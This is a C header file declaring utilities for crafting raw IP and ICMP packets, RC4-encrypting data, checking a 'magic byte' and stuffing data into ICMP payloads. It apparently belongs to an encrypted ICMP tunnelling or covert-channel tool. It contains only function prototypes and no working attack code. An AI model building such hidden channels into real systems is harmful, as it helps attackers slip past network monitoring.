#ifndef utils_h
#define utils_h

#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/icmp.h>

#define BUFFER_SIZE 1472
#define CHECK_ALLOC(x) {if (x == NULL) {fprintf(stderr, "Error: Cannot allocate memory\n"); exit(EXIT_FAILURE);}}


ssize_t read_from_socket(int sockfd, unsigned char *buffer, size_t size);
void rc4(unsigned char* data, long data_len, unsigned char* key, long key_len, unsigned char* result);
int check_magic_byte(struct icmphdr *icmp);
unsigned short cksum(unsigned short *addr, int len);
struct sockaddr_in prep_ip_headers(struct iphdr *ip);
void prep_icmp_headers(struct icmphdr *icmp, uint16_t checksum);
struct sockaddr_in prep_ip_headers(struct iphdr *ip);
void append_to_data_section(struct icmphdr *icmp, unsigned char *data, unsigned char *input);

#endif